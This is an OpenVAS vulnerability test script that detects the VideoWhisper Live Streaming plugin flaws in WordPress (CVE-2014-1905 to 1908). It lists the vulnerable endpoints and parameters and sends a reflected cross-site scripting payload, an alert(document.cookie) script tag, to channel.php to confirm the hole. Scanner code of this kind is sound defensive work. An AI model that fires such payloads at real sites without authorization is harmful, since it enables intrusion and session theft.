###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_videowhisper_mult_vuln.nasl 35802 2014-04-01 12:28:38Z Apr$
#
# WordPress VideoWhisper Live Streaming Integration Multiple Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804530";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6724 $");
  script_cve_id("CVE-2014-1906", "CVE-2014-1907", "CVE-2014-1905", "CVE-2014-1908");
  script_bugtraq_id(65876, 65877, 65866, 65880);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-07-14 11:57:17 +0200 (Fri, 14 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-04-01 12:28:38 +0530 (Tue, 01 Apr 2014)");
  script_name("WordPress VideoWhisper Live Streaming Integration Multiple Vulnerabilities");

  tag_summary =
"This host is installed with Wordpress VideoWhisper Live Streaming Integration
Plugin and is prone to multiple vulnerabilities.";

  tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.";

  tag_insight =
"Multiple flaws are due to an,
- Improper verification of file extensions before uploading files to the server
  in '/videowhisper-live-streaming-integration/ls/vw_snapshots.php'
- Input passed via HTTP POST parameters 'msg' to /ls/vc_chatlog.php, 'm' to
  /ls/lb_status.php, 'ct' to /ls/lb_status.php and /ls/v_status.php.
- Input passed via HTTP GET parameters 'n' to /ls/channel.php, htmlchat.php,
  ls/video.php, and /videotext.php, 'message' to /ls/lb_logout.php, and 's'
  to rtmp_login.php and rtmp_logout.php scripts.";

  tag_impact =
"Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site and
read/delete arbitrary files.

Impact Level: Application";

  tag_affected =
"WordPress VideoWhisper Live Streaming Integration Plugin version 4.27.3
and probably prior.";

  tag_solution =
"Upgrade to version 4.29.5 or later,
For updates refer to http://wordpress.org/plugins/videowhisper-live-streaming-integration";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);

  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/31986");
  script_xref(name : "URL" , value : "https://www.htbridge.com/advisory/HTB23199");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/125454");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:http_port)){
  exit(0);
}

## Construct the attack request
url = dir + '/wp-content/plugins/videowhisper-live-streaming-integration/ls'+
            '/channel.php?n=</title><script>alert(document.cookie)</script>';

## Confirm the Exploit
if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
   pattern:"<script>alert\(document.cookie\)</script>",
   extra_check:'>Video Whisper Live Streaming<'))
{
  security_message(http_port);
  exit(0);
}
